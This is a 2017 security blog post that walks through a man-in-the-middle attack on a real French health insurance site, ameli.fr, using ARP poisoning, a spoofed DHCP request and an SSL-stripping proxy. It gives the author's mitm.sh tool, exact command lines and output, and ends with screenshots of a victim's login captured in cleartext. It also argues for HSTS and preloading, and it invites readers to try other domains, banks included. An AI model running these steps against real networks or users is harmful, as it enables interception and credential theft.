---
layout: post
title:  "MITM, HSTS, and HTTP landing page in practice"
date:   2017-03-27
categories: mitm
---
<br />
Hi everybody,  
  
I already wrote some articles talking about the importance of implementing the HTTP Strict Transport Security ([HSTS](https://https.cio.gov/hsts/)) and to secure all the webpages, even the landing page.  
  
**Why all the pages should be secure ?**  
  
Because all the trafic should be hidden from prying eyes. If an attacker could interfer with only one page, several options are available to him. He can strip all secure headers, redirect trafic, change web page content, force HTTP trafic, and so on.  
Every case is different but keep in mind that if the victim is able to generate a plain HTTP request (http://website.com), the attacker can control all the trafic.  
  
However, if a ressource has been cached with HSTS, the browser will automatically do an internal redirect (Code 307).  
But what if HSTS has never been cached ? so we will be able to fool a victim an maintain an plain text connection as we will see (we won't deal with any certificate faking here.  
  
In our example we will do a **MITM** attack between a Kali VM and the [french social welfare website](http://ameli.fr). You can find so many other websites, even some online bank websites to reproduce the attack.  
MITM attacks still succeed if you are not protected with some soft/hardware dropping unsolicited ARP responses ([RFC 826](https://tools.ietf.org/html/rfc826)).  
  
So stop talking, go for the show:  
![pic1]({{ site.url }}/public/images/mitm-example/pic1.png)  
  
We have here an unsecure HTTP landing page. What happens if we click on *"Mon compte ameli"* in order to log in ?  
![pic2]({{ site.url }}/public/images/mitm-example/pic2.png)  
  
So we have a secure login page.  What about the response headers ?  
![pic3]({{ site.url }}/public/images/mitm-example/pic3.png)  
  
Another check:  
  
```bash
root@kali:/tmp$ nmap -p 443 --script http-hsts-verify assure.ameli.fr 
Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-27 20:08 CEST
Nmap scan report for assure.ameli.fr (93.174.145.36)
Host is up (0.016s latency).
PORT    STATE SERVICE
443/tcp open  https
| http-hsts-verify: 
|_  HSTS is not configured.

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
```
  
I created a wrapper script to manage all the tools involved in the MITM attack. My advice is to run it on a Kali machine. However it will automatically download the web proxy that we will use ([Mitmproxy](https://mitmproxy.org/)).  
  
```bash
root@kali:/tmp$ git clone https://github.com/phackt/mitm.git && cd ./mitm
Clonage dans 'mitm'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 49 (delta 15), reused 35 (delta 9), pack-reused 0
Dépaquetage des objets: 100% (49/49), fait.
root@kali:/tmp/mitm$ sudo ./mitm.sh
Usage: ./mitm.sh [-g] [-n] [-s] [-x] [-j] <js payload url> [-d] [-i] <interface> gateway_ip target_ip
       [-g] interactive mode for mitmproxy
       [-n] capture HTTP traffic
       [-s] capture HTTPS traffic
       [-x] stripping https
       [-j] inject js payload
       [-d] dnsspoof + setoolkit
       [-i] interface
```  
  
We are almost ready for our mitm attack. We will specify the interactive mode (mitmproxy GUI), the capture HTTP traffic mode only (not faking certificates) and we will apply our custom **sslstrip.py** script.  
  
If you check in details my github repo [https://github.com/phackt/mitm](https://github.com/phackt/mitm), you will find a **bin** folder with some others tools:  
 - **arpoison.sh** to automate ARP poisoning  
 - **chk_poison.py** which will check if an ARP poisoning is successful  
  
First let's check the ips:  
  
```bash
root@kali:/tmp/mitm# route -n
Table de routage IP du noyau
Destination     Passerelle      Genmask         Indic Metric Ref    Use Iface
0.0.0.0         192.168.1.1     0.0.0.0         UG    600    0        0 wlan0
root@kali:/tmp/mitm# nmap -sn 192.168.1.1/24
...
Nmap scan report for kali.home (192.168.1.19)
Host is up (0.00012s latency).
...
```  
  
Now run mitm.sh  
  
```bash
root@kali:/tmp/mitm# ./mitm.sh -g -n -x -i wlan0 192.168.1.1 192.168.1.19
INTERACTIVE_MODE On
HTTP_INTERCEPTION On
HTTPS_STRIPPING On

Installing mitmproxy v1, please wait...

--2017-03-27 20:49:08--  https://github.com/mitmproxy/mitmproxy/releases/download/v1.0/mitmproxy-1.0.0post1-linux.tar.gz
Résolution de github.com (github.com)… 192.30.253.113, 192.30.253.112
Connexion à github.com (github.com)|192.30.253.113|:443… connecté.
requête HTTP transmise, en attente de la réponse… 302 Found
Emplacement : https://github-cloud.s3.amazonaws.com/releases/519832/3dcda87e-cbe7-11e6-90f5-73a30be85192.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAISTNZFOVBIJMK3TQ%2F20170327%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20170327T194852Z&X-Amz-Expires=300&X-Amz-Signature=584985dd5837498f44b588a4bd9f6378f1e12783e75b6dc2ec1acca2772da86f&X-Amz-SignedHeaders=host&actor_id=0&response-content-disposition=attachment%3B%20filename%3Dmitmproxy-1.0.0post1-linux.tar.gz&response-content-type=application%2Foctet-stream [suivant]
--2017-03-27 20:49:08--  https://github-cloud.s3.amazonaws.com/releases/519832/3dcda87e-cbe7-11e6-90f5-73a30be85192.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAISTNZFOVBIJMK3TQ%2F20170327%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20170327T194852Z&X-Amz-Expires=300&X-Amz-Signature=584985dd5837498f44b588a4bd9f6378f1e12783e75b6dc2ec1acca2772da86f&X-Amz-SignedHeaders=host&actor_id=0&response-content-disposition=attachment%3B%20filename%3Dmitmproxy-1.0.0post1-linux.tar.gz&response-content-type=application%2Foctet-stream
Résolution de github-cloud.s3.amazonaws.com (github-cloud.s3.amazonaws.com)… 54.231.114.227
Connexion à github-cloud.s3.amazonaws.com (github-cloud.s3.amazonaws.com)|54.231.114.227|:443… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 70081542 (67M) [application/octet-stream]
Sauvegarde en : « /tmp/mitm/mitmproxy/mitmproxy.tar »

/tmp/mitm/mitmproxy/mitmproxy.tar     100%[=======================================================================>]  66,83M  4,94MB/s    in 14s     

2017-03-27 20:49:23 (4,82 MB/s) — « /tmp/mitm/mitmproxy/mitmproxy.tar » sauvegardé [70081542/70081542]

mitmproxy
mitmdump
mitmweb

Installation done.

Flushing iptables...
Setting configuration...
No poisoning between 192.168.1.1 -> 192.168.1.19
Do you want to force poisoning? [Yn]:Y
Trying DHCP REQUEST to poison 192.168.1.1...
no answer
Poisoning successful!!!
```  
  
**chk_poison.py** can try to force poisoning (works on Orange Livebox) by sending a spoofed DHCP request. The router will automatically generate ARP request after that and will legitimate our spoofed ARP responses.  
  
So now we are definitely ready to intercept the trafic.  
![pic4]({{ site.url }}/public/images/mitm-example/pic4.png)  
  
Now imagine that the victim is surfing on http://www.ameli.fr.  
![pic5]({{ site.url }}/public/images/mitm-example/pic5.png)  
  
We see the trafic passing through the attacker machine.  
From the victim's point of view, everything seems transparent... but notice a detail:  
![pic6]({{ site.url }}/public/images/mitm-example/pic6.png)  
  
*https://assure.ameli.fr* became *http://assure.ameli.fr*. Our script will know that it will have to replay the secure connection on the other side. Now when our victim wants to access the login page:  
![pic7]({{ site.url }}/public/images/mitm-example/pic7.png)  
  
Everything seems ok, except.... Where is the green padlock ![padlock]({{ site.url }}/public/images/mitm-example/padlock.png) ???  
So here we are, **sslstrip.py** has done its job, switching every https links into http, deleting every secure headers (HSTS too, so if not cached, the attack will succeed). The script will remind what domains need SSL/TLS and replay the connections in a secure manner with the destination website.  

So we have **Victim <- HTTP -> Attacker (Mitmproxy) <- HTTPS -> Website**.  We can now intercept all the trafic in clear.  
  
Don't be impatient, the victim will log in a few seconds.  
![pic8]({{ site.url }}/public/images/mitm-example/pic8.png)  
  
In our proxy we can see the post request. Let's check the details:  
![pic9]({{ site.url }}/public/images/mitm-example/pic9.png)  
  
Credentials have been stolen.  
And from our victim, is this transparent ?:  
![pic10]({{ site.url }}/public/images/mitm-example/pic10.png)  
  
A lot of people will not notice that the connection is not secure (except you infosec ninjas) and will keep on surfing.  
  
Is it really much more expensive to have all the pages secure ? [HSTS](https://tools.ietf.org/html/rfc6797) is also just one header in the response that can easily be added. Companies should also think to have their domain in the preload list in order to perform a 307 internal redirect from the very first request.  
Finally we can not talk here about vulnerability, but more as a lack of responsability.   
  
I sincerely hope you enjoyed as i liked to do this post.  
Feel free to comment if you have any question, or if you find other cool domains.  
  
Tchuss,  
Phackt.  
  
References:
 - [https://nmap.org/nsedoc/scripts/http-hsts-verify.html](https://nmap.org/nsedoc/scripts/http-hsts-verify.html)  
 - [https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet)  

